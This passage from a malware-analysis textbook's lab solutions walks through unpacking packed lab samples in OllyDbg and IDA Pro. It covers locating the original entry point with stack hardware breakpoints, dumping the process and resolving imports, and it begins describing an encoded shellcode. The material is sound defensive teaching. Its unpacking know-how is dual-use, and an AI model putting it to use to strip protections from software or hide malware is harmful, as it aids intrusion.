  type: TYPE_NORMAL
- en: 0040A11B CLD
  prefs: []
  type: TYPE_NORMAL
- en: 0040A11C MOV DL,80
  prefs: []
  type: TYPE_NORMAL
- en: 0040A11E MOV AL,BYTE PTR DS:[ESI]
  prefs: []
  type: TYPE_NORMAL
- en: 0040A120 INC ESI
  prefs: []
  type: TYPE_NORMAL
- en: 0040A121 MOV BYTE PTR DS:[EDI],AL
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-4L: OllyDump’s guess at the OEP after using the Find OEP by Section
    Hop (Trace* *Into) option*'
  prefs: []
  type: TYPE_NORMAL
- en: '**686**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we try the **Find OEP by Section Hop (Trace Over)** option and we see
    that the code stops on a ret instruction at the end of a function in ntdll, which
    is clearly not the OEP.
  prefs: []
  type: TYPE_NORMAL
- en: Since the OllyDump plug-in didn’t work, we examine the code to see if the tail
    jump is easy to spot. As shown in Listing 18-5L, we eventually come to some code
    that looks like a tail jump. This code is a retn instruction followed by a bunch
    of zero bytes. We know that the code can’t go past this point.
  prefs: []
  type: TYPE_NORMAL
- en: 00405622 SCAS DWORD PTR ES:[EDI]
  prefs: []
  type: TYPE_NORMAL
- en: 00405623 ADD BH,CH
  prefs: []
  type: TYPE_NORMAL
- en: 00405625 STC
  prefs: []
  type: TYPE_NORMAL
- en: 00405626 RETN 0EC3F
  prefs: []
  type: TYPE_NORMAL
- en: 00405629 ADD BYTE PTR DS:[EAX],AL
  prefs: []
  type: TYPE_NORMAL
- en: 0040562B ADD BYTE PTR DS:[EAX],AL
  prefs: []
  type: TYPE_NORMAL
- en: 0040562D ADD BYTE PTR DS:[EAX],AL
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-5L: A possible tail jump*'
  prefs: []
  type: TYPE_NORMAL
- en: Now, we set a breakpoint on the retn instruction at  and start our program.
    First, we set a regular breakpoint (INT 3). OllyDbg displays a warning, because
    the breakpoint is outside the code section and may cause problems.
  prefs: []
  type: TYPE_NORMAL
- en: When we run our program, we eventually get an exception that the program can’t
    handle, and we see that the code at our breakpoint has been changed.
  prefs: []
  type: TYPE_NORMAL
- en: Now we know that the code is self-modifying and that our breakpoint has not
    worked properly.
  prefs: []
  type: TYPE_NORMAL
- en: When dealing with self-modifying code, it’s often useful to use a hardware breakpoint
    instead of a software breakpoint because the self-modifying code will overwrite
    the INT 3 (0xcc) instruction used to implement software breakpoints. Starting
    over with a hardware breakpoint, we run the program and see that it starts to
    run without ever hitting our breakpoint. This tells us that we probably haven’t
    found the tail jump and we need to try another strategy.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the entry point of the packed program, we see the instructions shown
    in Listing 18-6L.
  prefs: []
  type: TYPE_NORMAL
- en: 00405130 JMP SHORT Lab09-02.00405138
  prefs: []
  type: TYPE_NORMAL
- en: 00405132 PUSH 1577
  prefs: []
  type: TYPE_NORMAL
- en: 00405137 RETN
  prefs: []
  type: TYPE_NORMAL
- en: 00405138 PUSHFD
  prefs: []
  type: TYPE_NORMAL
- en: 00405139 PUSHAD
  prefs: []
  type: TYPE_NORMAL
- en: '**1 8**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040513A CALL Lab09-02.00405141
  prefs: []
  type: TYPE_NORMAL
- en: 0040513F XOR EAX,EAX
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-6L: Start of the unpacking stub*'
  prefs: []
  type: TYPE_NORMAL
- en: The first instruction at  is an unconditional jump that skips the next two
    instructions. The first two instructions that affect memory are pushfd at 
  prefs: []
  type: TYPE_NORMAL
- en: and pushad at . These instructions save all of the registers and flags. It’s
    likely that the packing program will restore all the registers and flags immediately
    before it jumps to the OEP, so we can try to find the OEP by setting an Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**687**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 155](index-721_1.png)'
  prefs: []
  type: TYPE_IMG
- en: access breakpoint on the stack. Presumably, there will be a popad or popfd instruction
    right before the tail jump, which will lead us to the OEP.
  prefs: []
  type: TYPE_NORMAL
- en: We restart the program and step-over the first three instructions. The program
    should be stopped at the call instruction at  in Listing 18-6L. Now we need to
    find the value of the stack pointer to set a breakpoint. To do so, we examine
    the registers window, as shown on the top right of Figure 18-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 18-1L: Setting a hardware breakpoint on the stack to help find OEP*'
  prefs: []
  type: TYPE_NORMAL
- en: The stack is at address 0x12FFA0, as shown at  in Figure 18-1L. To set a breakpoint,
    we first load that address in the memory dump by right-clicking  and selecting
    **Follow in Dump**. This will make the memory dump window at  appear as it does
    in Figure 18-1L.
  prefs: []
  type: TYPE_NORMAL
- en: To set a breakpoint on the last piece of data pushed onto the stack, we right-click
    the first data element on the stack at  in Figure 18-1L and select **Breakpoint****Memory
    on Access**. We then run our program. Unfortunately, it reaches an unhandled exception
    similar to when we set a breakpoint before.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we set the breakpoint with **Breakpoint****Hardware, on Access****Dword**.
  prefs: []
  type: TYPE_NORMAL
- en: When we start our program, our breakpoint is triggered. The program will break
    at the instructions shown in Listing 18-7L.
  prefs: []
  type: TYPE_NORMAL
- en: 0040754F POPFD
  prefs: []
  type: TYPE_NORMAL
- en: 00407550 PUSH EAX
  prefs: []
  type: TYPE_NORMAL
- en: 00407551 PUSH Lab18-03.00401577
  prefs: []
  type: TYPE_NORMAL
- en: 00407556 RETN 4
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-7L: Instructions where our stack breakpoint is triggered showing
    the tail jump* A few instructions into our code, we see a retn instruction that
    transfers execution to another location. This is probably the tail jump. We step
    to that instruction to determine where it goes and see the code in Listing 18-8L.
    This looks like the original code; the call to GetVersion at  is a dead giveaway.'
  prefs: []
  type: TYPE_NORMAL
- en: '**688**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*As in* Lab18-02.exe *, you may need to force OllyDbg to disassemble this code
    using the* *Analysis* *Analyze Code command.*'
  prefs: []
  type: TYPE_NORMAL
- en: 00401577 PUSH EBP
  prefs: []
  type: TYPE_NORMAL
- en: 00401578 MOV EBP,ESP
  prefs: []
  type: TYPE_NORMAL
- en: 0040157A PUSH -1
  prefs: []
  type: TYPE_NORMAL
- en: 0040157C PUSH Lab18-03.004040C0
  prefs: []
  type: TYPE_NORMAL
- en: 00401581 PUSH Lab18-03.0040203C ; SE handler installation 00401586 MOV EAX,DWORD
    PTR FS:[0]
  prefs: []
  type: TYPE_NORMAL
- en: 0040158C PUSH EAX
  prefs: []
  type: TYPE_NORMAL
- en: 0040158D MOV DWORD PTR FS:[0],ESP
  prefs: []
  type: TYPE_NORMAL
- en: 00401594 SUB ESP,10
  prefs: []
  type: TYPE_NORMAL
- en: 00401597 PUSH EBX
  prefs: []
  type: TYPE_NORMAL
- en: 00401598 PUSH ESI
  prefs: []
  type: TYPE_NORMAL
- en: 00401599 PUSH EDI
  prefs: []
  type: TYPE_NORMAL
- en: 0040159A MOV DWORD PTR SS:[EBP-18],ESP
  prefs: []
  type: TYPE_NORMAL
- en: '0040159D CALL DWORD PTR DS:[404030] ; kernel32.GetVersion *Listing 18-8L:
    The OEP for Lab 18-3*'
  prefs: []
  type: TYPE_NORMAL
- en: Now, with EIP pointing to the first instruction at , we select **Plugins**
  prefs: []
  type: TYPE_NORMAL
- en: '**OllyDump****Dump Debugged Process**. We click the **Get EIP as OEP** button,
    leaving all the other options with their default settings, and then click **Dump**.'
  prefs: []
  type: TYPE_NORMAL
- en: In the dialog, we enter a filename to save a copy of our unpacked program.
  prefs: []
  type: TYPE_NORMAL
- en: When we’re finished, we run the program and open it in IDA Pro to verify that
    it has been unpacked successfully. A brief analysis of the program reveals that
    the functionality is the same as *Lab09-02.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: This packer uses a variety of techniques to make it difficult to unpack and
    recognize the tail jump. Several of the usual strategies were ineffective because
    the packer takes explicit steps to thwart them. If using a particular technique
    seems difficult on a packed program, try different approaches until one works.
    In rare cases, none of the techniques will work easily.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 18-4 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: We open the *Lab18-04.exe* file in PEiD and learn that it is packed with ASPack
    2.12 -> Alexey Solodovnikov. We then open the malware in OllyDbg and see that
    the first instruction is pushad, which saves the registers onto the stack. We
    know from Chapter 18 that setting a breakpoint on the stack to search for the
    corresponding popad instruction may be a good strategy for this **1 8**
  prefs: []
  type: TYPE_NORMAL
- en: packer. We step-over the pushad instruction, as shown in Listing 18-9L at .
  prefs: []
  type: TYPE_NORMAL
- en: 00411001 PUSHAD
  prefs: []
  type: TYPE_NORMAL
- en: 00411002 CALL Lab18-04.0041100A
  prefs: []
  type: TYPE_NORMAL
- en: 00411007 JMP 459E14F7
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-9L: Start of the unpacking stub*'
  prefs: []
  type: TYPE_NORMAL
- en: We’re going to use the same technique that we used in the previous lab.
  prefs: []
  type: TYPE_NORMAL
- en: Once we step-over the pushad instruction, our window looks like Figure 18-2L.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**689**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 156](index-723_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 18-2L: Setting a breakpoint on the stack for* Lab18-04.exe We right-click
    esp at  and select **Follow in Dump** in order to display the memory window,
    as shown in Figure 18-2L. We then click the top of the stack at  and select **Breakpoint****Hardware,
    on Access****DWORD** to set a breakpoint on the stack instruction.'
  prefs: []
  type: TYPE_NORMAL
- en: We press F9 to start the program again. The program eventually hits our breakpoint,
    and we see the code shown in Listing 18-10L.
  prefs: []
  type: TYPE_NORMAL
- en: 004113AF POPAD
  prefs: []
  type: TYPE_NORMAL
- en: 004113B0 JNZ SHORT Lab18-04.004113BA
  prefs: []
  type: TYPE_NORMAL
- en: 004113B2 MOV EAX,1
  prefs: []
  type: TYPE_NORMAL
- en: 004113B7 RETN 0C
  prefs: []
  type: TYPE_NORMAL
- en: 004113BA PUSH Lab18-04.00403896
  prefs: []
  type: TYPE_NORMAL
- en: 004113BF RETN
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-10L: Instructions after our stack breakpoint is triggered* We see
    a jnz instruction at , immediately after the popad instruction. We know that
    the popad should be followed closely by the tail jump, which transfers execution
    to the OEP. We step-over the jnz instruction and see that it jumps just a few
    instructions ahead. There we see a push followed by a retn, which transfers execution
    to the address pushed onto the stack and might be our tail jump.'
  prefs: []
  type: TYPE_NORMAL
- en: When we step over the retn instruction, we see that our instruction pointer
    has been transferred to another area of the program. As in previous labs, OllyDbg
    may not have disassembled this code, as shown in Listing 18-11L.
  prefs: []
  type: TYPE_NORMAL
- en: 00403896 DB 55 ; CHAR 'U'
  prefs: []
  type: TYPE_NORMAL
- en: 00403897 DB 8B
  prefs: []
  type: TYPE_NORMAL
- en: 00403898 DB EC
  prefs: []
  type: TYPE_NORMAL
- en: '**690**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00403899 DB 6A ; CHAR 'j'
  prefs: []
  type: TYPE_NORMAL
- en: 0040389A DB FF
  prefs: []
  type: TYPE_NORMAL
- en: 0040389B DB 68 ; CHAR 'h'
  prefs: []
  type: TYPE_NORMAL
- en: 0040389C DB 88
  prefs: []
  type: TYPE_NORMAL
- en: 0040389D DB B1
  prefs: []
  type: TYPE_NORMAL
- en: 0040389E DB 40 ; CHAR '@'
  prefs: []
  type: TYPE_NORMAL
- en: 0040389F DB 00
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-11L: OEP of the code before OllyDbg has analyzed it* We know this
    is code, so we tell OllyDbg to disassemble it by right-clicking the first byte
    and selecting **Analysis****Analyze Code**. Now we see what looks like legitimate
    code with the telltale GetModuleHandleA function, as shown in Listing 18-12L.
    This confirms our suspicions that this is the OEP.'
  prefs: []
  type: TYPE_NORMAL
- en: 00403896 PUSH EBP
  prefs: []
  type: TYPE_NORMAL
- en: 00403897 MOV EBP,ESP
  prefs: []
  type: TYPE_NORMAL
- en: 00403899 PUSH -1
  prefs: []
  type: TYPE_NORMAL
- en: 0040389B PUSH Lab18-04.0040B188
  prefs: []
  type: TYPE_NORMAL
- en: 004038A0 PUSH Lab18-04.004064AC ; SE handler installation 004038A5 MOV EAX,DWORD
    PTR FS:[0]
  prefs: []
  type: TYPE_NORMAL
- en: 004038AB PUSH EAX
  prefs: []
  type: TYPE_NORMAL
- en: 004038AC MOV DWORD PTR FS:[0],ESP
  prefs: []
  type: TYPE_NORMAL
- en: 004038B3 SUB ESP,10
  prefs: []
  type: TYPE_NORMAL
- en: 004038B6 PUSH EBX
  prefs: []
  type: TYPE_NORMAL
- en: 004038B7 PUSH ESI
  prefs: []
  type: TYPE_NORMAL
- en: 004038B8 PUSH EDI
  prefs: []
  type: TYPE_NORMAL
- en: 004038B9 MOV DWORD PTR SS:[EBP-18],ESP
  prefs: []
  type: TYPE_NORMAL
- en: '004038BC CALL DWORD PTR DS:[40B0B8] ; kernel32.GetVersion *Listing 18-12L:
    OEP after OllyDbg has analyzed the code* Next, we select **Plugins****OllyDump****Dump
    Debugged Process**. We click the **Get EIP as OEP** button, accept the default
    settings, and click **Dump**. In the dialog, we enter a filename to save a copy
    of the unpacked program.'
  prefs: []
  type: TYPE_NORMAL
- en: Having dumped the program, run it to verify that it works properly.
  prefs: []
  type: TYPE_NORMAL
- en: Then open it in IDA Pro to verify that it is unpacked and has the same functionality
    as *Lab09-01.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 18-5 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 8**'
  prefs: []
  type: TYPE_NORMAL
- en: The program in the *Lab18-05.exe* file is *Lab07-01.exe* packed with WinUpack.
  prefs: []
  type: TYPE_NORMAL
- en: When we load this file into PEiD, it’s recognized as being packed with WinUpack
    0.39\. However, the file’s PE header is badly damaged. If we load it into OllyDbg,
    IDA Pro, or PEview, we get several errors that make it impossible to view information
    from the PE header.
  prefs: []
  type: TYPE_NORMAL
- en: We load the file into OllyDbg and see an error stating “Bad or unknown format
    of 32-bit executable file.” OllyDbg can load the file, but it can’t find the entry
    point for the unpacking stub and instead breaks at the system breakpoint, which
    occurs well before the unpacking stub.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**691**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Because we have not even reached the unpacking stub, most of our techniques
    will not work. We could step-into and step-over instructions carefully until we
    reach the unpacking stub, and then work from there, but that would be a long and
    frustrating process. Instead, we will set breakpoints on LoadLibrary and GetProcAddress
    in order to bypass the beginning of the unpacking stub.
  prefs: []
  type: TYPE_NORMAL
- en: We know that loading imported libraries and resolving the imports with GetProcAddress
    are a couple of the last steps performed by the unpacking stub.
  prefs: []
  type: TYPE_NORMAL
- en: If we can set a breakpoint that is triggered on the last call to GetProcAddress,
    we’ll be very close to the tail jump, but there’s no way to know which call to
    GetProcAddress is last until after the call is executed. Instead, we set breakpoints
    on LoadLibrary and GetProcAddress, and use trial-and-error to figure out which
    call is last.
  prefs: []
  type: TYPE_NORMAL
- en: We begin by setting a breakpoint on the first instruction of LoadLibrary by
    pressing CTRL-G and entering **LoadLibraryA** into the dialog. This should take
    us to the first instruction of LoadLibraryA, where we press F2 to set a breakpoint.
    We then repeat the process with LoadLibraryW so that we have a breakpoint on both
    versions of LoadLibrary, and then press F9 to start the program.
  prefs: []
  type: TYPE_NORMAL
- en: We’re using the fact that LoadLibrary is called as a way to bypass as much of
    the unpacking stub as possible because we want to keep running the program until
    the last call to LoadLibrary. Because we don’t know which call to LoadLibrary
    is the last one (until it’s too late), each time the breakpoint is hit, we continue
    running the program and note the library being loaded. If the library being loaded
    is not the last one, the program will stop very quickly once the next library
    is loaded. When the last library is loaded, the program should continue running,
    and that is how we know we have found the last call to LoadLibrary. When we set
    our breakpoint on LoadLibrary, we see that the first library loaded is *kernel32.dll*,
    followed by *advapi32.dll*, and so on.
  prefs: []
  type: TYPE_NORMAL
- en: The fifth and sixth calls to LoadLibrary load *commctrl.dll*. After the sixth
    call, we continue running the program, and it does not stop. The sixth call is
    the final one.
  prefs: []
  type: TYPE_NORMAL
- en: Now we restart our program. We reset our breakpoint on LoadLibrary, and then
    run the program until the breakpoint is hit a sixth time and the parameter is
    commctrl. Next, we set a breakpoint on GetProcAddress and perform the same procedure
    to determine which API function is the last to be resolved with GetProcAddress.
  prefs: []
  type: TYPE_NORMAL
- en: We run the program several times to find out which function is loaded last.
    After a call to GetProcAddress with the value InternetOpenA, we see that the program
    continues to run without hitting our breakpoint again. Now we restart our program
    once again. We reset our breakpoints on LoadLibraryA and LoadLibraryW, and run
    the program until the final call to LoadLibrary.
  prefs: []
  type: TYPE_NORMAL
- en: Then we run the program until the final call to GetProcAddress.
  prefs: []
  type: TYPE_NORMAL
- en: Resolving the imports is nearly the last step in the unpacking stub. The only
    task remaining after resolving the imports is the transfer of control to the OEP.
    The unpacking stub is nearly finished, and we can step through the code to find
    the OEP.
  prefs: []
  type: TYPE_NORMAL
- en: '**692**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'We step through the rest of the GetProcAddress until the ret instruction brings
    us back to the unpacking stub, and then we continue to step through the code until
    we see what looks like the tail jump. The next control transfer instruction is
    shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: 00408EB4 STOS DWORD PTR ES:[EDI]
  prefs: []
  type: TYPE_NORMAL
- en: 00408EB5 JMP SHORT Lab07_01.00408E9E
  prefs: []
  type: TYPE_NORMAL
- en: This is not the tail jump because it’s relatively short and goes to the following
    code, which doesn’t look like the start of a program.
  prefs: []
  type: TYPE_NORMAL
- en: 00408E9E LODS BYTE PTR DS:[ESI]
  prefs: []
  type: TYPE_NORMAL
- en: 00408E9F TEST AL,AL
  prefs: []
  type: TYPE_NORMAL
- en: 00408EA1 JNZ SHORT Lab07_01.00408E9E
  prefs: []
  type: TYPE_NORMAL
- en: 'These instructions form a short loop, and we step through this code until the
    loop is finished. When the loop is complete, the code falls through to these instructions:'
  prefs: []
  type: TYPE_NORMAL
- en: 00408EA3 CMP BYTE PTR DS:[ESI],AL
  prefs: []
  type: TYPE_NORMAL
- en: 00408EA5 JE SHORT Lab07_01.00408E91
  prefs: []
  type: TYPE_NORMAL
- en: This is also not the tail jump because it is relatively short and the code at
    the target doesn’t look like the start of a program.
  prefs: []
  type: TYPE_NORMAL
- en: 00408E91 POP ECX
  prefs: []
  type: TYPE_NORMAL
- en: 00408E92 INC ESI
  prefs: []
  type: TYPE_NORMAL
- en: 00408E93 LODS DWORD PTR DS:[ESI]
  prefs: []
  type: TYPE_NORMAL
- en: 00408E94 TEST EAX,EAX
  prefs: []
  type: TYPE_NORMAL
- en: 00408E96 JE SHORT Lab07_01.00408EB7
  prefs: []
  type: TYPE_NORMAL
- en: The jump at this next block of code goes to a retn instruction. A normal program
    would never start with a retn instruction, so we also know that isn’t the tail
    jump.
  prefs: []
  type: TYPE_NORMAL
- en: 00408EB7 C3 RETN
  prefs: []
  type: TYPE_NORMAL
- en: When we step-over the retn instruction, we see the code shown in Listing 18-13L.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 8**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401190 PUSH EBP
  prefs: []
  type: TYPE_NORMAL
- en: 00401191 MOV EBP,ESP
  prefs: []
  type: TYPE_NORMAL
- en: 00401193 PUSH -1
  prefs: []
  type: TYPE_NORMAL
- en: 00401195 PUSH Lab07_01.004040D0
  prefs: []
  type: TYPE_NORMAL
- en: 0040119A PUSH Lab07_01.00401C58
  prefs: []
  type: TYPE_NORMAL
- en: 0040119F MOV EAX,DWORD PTR FS:[0]
  prefs: []
  type: TYPE_NORMAL
- en: 004011A5 PUSH EAX
  prefs: []
  type: TYPE_NORMAL
- en: 004011A6 MOV DWORD PTR FS:[0],ESP
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**693**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004011AD SUB ESP,10
  prefs: []
  type: TYPE_NORMAL
- en: 004011B0 PUSH EBX
  prefs: []
  type: TYPE_NORMAL
- en: 004011B1 PUSH ESI
  prefs: []
  type: TYPE_NORMAL
- en: 004011B2 PUSH EDI
  prefs: []
  type: TYPE_NORMAL
- en: 004011B3 MOV DWORD PTR SS:[EBP-18],ESP
  prefs: []
  type: TYPE_NORMAL
- en: 004011B6 CALL DWORD PTR DS:[40404C]
  prefs: []
  type: TYPE_NORMAL
- en: ; kernel32.GetVersion
  prefs: []
  type: TYPE_NORMAL
- en: 004011BC XOR EDX,EDX
  prefs: []
  type: TYPE_NORMAL
- en: 004011BE MOV DL,AH
  prefs: []
  type: TYPE_NORMAL
- en: 004011C0 MOV DWORD PTR DS:[405304],EDX
  prefs: []
  type: TYPE_NORMAL
- en: 004011C6 MOV ECX,EAX
  prefs: []
  type: TYPE_NORMAL
- en: 004011C8 AND ECX,0FF
  prefs: []
  type: TYPE_NORMAL
- en: 004011CE MOV DWORD PTR DS:[405300],ECX
  prefs: []
  type: TYPE_NORMAL
- en: 004011D4 SHL ECX,8
  prefs: []
  type: TYPE_NORMAL
- en: 004011D7 ADD ECX,EDX
  prefs: []
  type: TYPE_NORMAL
- en: 004011D9 MOV DWORD PTR DS:[4052FC],ECX
  prefs: []
  type: TYPE_NORMAL
- en: 004011DF SHR EAX,10
  prefs: []
  type: TYPE_NORMAL
- en: 004011E2 MOV DWORD PTR DS:[4052F8],EAX
  prefs: []
  type: TYPE_NORMAL
- en: 004011E7 PUSH 0
  prefs: []
  type: TYPE_NORMAL
- en: 004011E9 CALL Lab07_01.00401B21
  prefs: []
  type: TYPE_NORMAL
- en: 004011EE POP ECX
  prefs: []
  type: TYPE_NORMAL
- en: 004011EF TEST EAX,EAX
  prefs: []
  type: TYPE_NORMAL
- en: 004011F1 JNZ SHORT Lab07_01.004011FB
  prefs: []
  type: TYPE_NORMAL
- en: 004011F3 PUSH 1C
  prefs: []
  type: TYPE_NORMAL
- en: 004011F5 CALL Lab07_01.00401294
  prefs: []
  type: TYPE_NORMAL
- en: 004011FA POP ECX
  prefs: []
  type: TYPE_NORMAL
- en: 004011FB AND DWORD PTR SS:[EBP-4],0
  prefs: []
  type: TYPE_NORMAL
- en: 004011FF CALL Lab07_01.00401976
  prefs: []
  type: TYPE_NORMAL
- en: 00401204 CALL DWORD PTR DS:[404048]
  prefs: []
  type: TYPE_NORMAL
- en: ; kernel32.GetCommandLineA
  prefs: []
  type: TYPE_NORMAL
- en: 0040120A MOV DWORD PTR DS:[4057F8],EAX
  prefs: []
  type: TYPE_NORMAL
- en: 0040120F CALL Lab07_01.00401844
  prefs: []
  type: TYPE_NORMAL
- en: 00401214 MOV DWORD PTR DS:[4052E0],EAX
  prefs: []
  type: TYPE_NORMAL
- en: 00401219 CALL Lab07_01.004015F7
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-13L: The OEP for* Lab18-05.exe'
  prefs: []
  type: TYPE_NORMAL
- en: 'This looks like the OEP for several reasons:'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: It’s a relatively far jump.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The code starts with a push ebp at , which indicates the beginning of a function.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The code in this function calls GetVersion at  and GetCommandLineA at , which
    are commonly called at the very beginning of a program.
  prefs: []
  type: TYPE_NORMAL
- en: Having identified the OEP, we use **Plugins****OllyDump****Dump** **Debugged
    Process** to dump the unpacked program. Next, we load the program into IDA Pro,
    but, unfortunately, we get some errors. Apparently, the program’s file headers
    are not fully repaired. However, IDA Pro has labeled the main function anyway,
    so we can analyze the program even though the PE file isn’t fully reconstructed.
  prefs: []
  type: TYPE_NORMAL
- en: '**694**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The biggest roadblock is that we don’t have any import information.
  prefs: []
  type: TYPE_NORMAL
- en: However, we can easily spot the calls to imported functions by looking for calls
    to data locations. For example, let’s look at the main method, as shown in Listing
    18-14L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401000 sub esp, 10h
  prefs: []
  type: TYPE_NORMAL
- en: 00401003 lea eax, [esp+10h+var_10]
  prefs: []
  type: TYPE_NORMAL
- en: 00401007 mov [esp+10h+var_10], offset aMalservice ; "MalService"
  prefs: []
  type: TYPE_NORMAL
- en: 0040100F push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401010 mov [esp+14h+var_C], offset sub_401040
  prefs: []
  type: TYPE_NORMAL
- en: 00401018 mov [esp+14h+var_8], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401020 mov [esp+14h+var_4], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401028 call dword_404004
  prefs: []
  type: TYPE_NORMAL
- en: 0040102E push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401030 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401032 call sub_401040
  prefs: []
  type: TYPE_NORMAL
- en: 00401037 add esp, 18h
  prefs: []
  type: TYPE_NORMAL
- en: 0040103A retn
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-14L: The main method for unpacked* Lab18-05.exe The call at  jumps
    out as a call to an imported function. You can click the DWORD to view the address
    of the imported functions for this program, as shown in Listing 18-15L.'
  prefs: []
  type: TYPE_NORMAL
- en: 00404000 dword_404000 dd 77E371E9h
  prefs: []
  type: TYPE_NORMAL
- en: 00404004 dword_404004 dd 77E37EB1h
  prefs: []
  type: TYPE_NORMAL
- en: 00404008 dword_404008 dd 77DF697Eh
  prefs: []
  type: TYPE_NORMAL
- en: 0040400C align 10h
  prefs: []
  type: TYPE_NORMAL
- en: 00404010 dword_404010 dd 7C862AC1h
  prefs: []
  type: TYPE_NORMAL
- en: 00404014 dword_404014 dd 7C810BACh
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 18-15L: Imported functions that have not been recognized by IDA Pro*
    To make the unpacked code easier to analyze, we turn to OllyDbg to find out which
    function is stored at those locations. The easiest way to identify which imported
    function is stored at a given address in OllyDbg is to change the value of any
    register to the address you want to look up. For example, to identify the imported
    function stored at dword_404004, double-click eax and enter the value **0x77E37EB1**.
    We see that OllyDbg labels the address as Advapi32.StartServiceCtrlDispatcherA.
    We can rename the DWORD address in IDA Pro to StartServiceCtrlDispatcherA. Now
    whenever the malware calls the **1 8**'
  prefs: []
  type: TYPE_NORMAL
- en: recently renamed address, it will be labeled as StartServiceCtrlDispatcherA,
    instead of dword_404004\.
  prefs: []
  type: TYPE_NORMAL
- en: We can repeat this process for each imported function, and then we will have
    a program that we can analyze in IDA Pro as if it were never packed. We still
    have not created a working version of the unpacked file, but it doesn’t really
    matter, because we can analyze the file without it. Looking at the file, we can
    tell that this is the same as *Lab07-01.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**695**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 19-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode is stored with an alphabetic encoding; each payload byte is stored
    in the low nibble of two encoded bytes.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The shellcode resolves the following functions:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetSystemDirectoryA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: TerminateProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetCurrentProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: WinExec
  prefs: []
